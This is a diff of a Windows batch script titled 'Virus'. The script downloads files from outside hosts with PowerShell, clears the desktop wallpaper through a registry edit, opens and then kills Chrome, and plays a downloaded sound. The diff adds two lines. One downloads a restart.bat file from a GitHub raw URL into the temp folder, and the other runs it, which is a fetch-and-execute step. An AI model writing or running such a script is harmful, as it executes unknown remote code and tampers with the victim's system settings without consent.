@@ -1,6 +1,7 @@
 title Virus
 cls
 @echo off
+powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/FearOffTheFart/Bash/master/restart.bat -OutFile %temp%\restart.bat"
 powershell -Command "Invoke-WebRequest http://art-exlibris.net/images/large/exlibris_27269.jpg -OutFile %temp%\hatter.jpg"
 timeout 1
 reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /d "" /f 
@@ -18,6 +19,7 @@ start chrome.exe "http://art-exlibris.net/images/large/exlibris_21693.jpg"
 timeout 4
 taskkill /IM chrome.exe -F
 powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/FearOffTheFart/Bash/master/clownlaugh.mp3 -OutFile %temp%\asd.mp3"
+start "" %temp%\restart.bat
 del %temp%\hatter.jpg
 del %temp%\asd.mp3
 del %temp%\nothing2.bat
